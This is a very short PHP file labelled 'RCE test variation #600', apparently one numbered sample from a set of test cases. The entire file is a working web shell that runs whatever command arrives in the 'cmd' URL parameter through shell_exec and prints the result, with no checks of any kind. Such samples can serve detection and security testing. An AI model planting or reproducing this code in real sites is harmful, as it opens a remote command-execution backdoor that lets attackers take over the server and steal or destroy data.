<?php
// RCE test variation #600
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>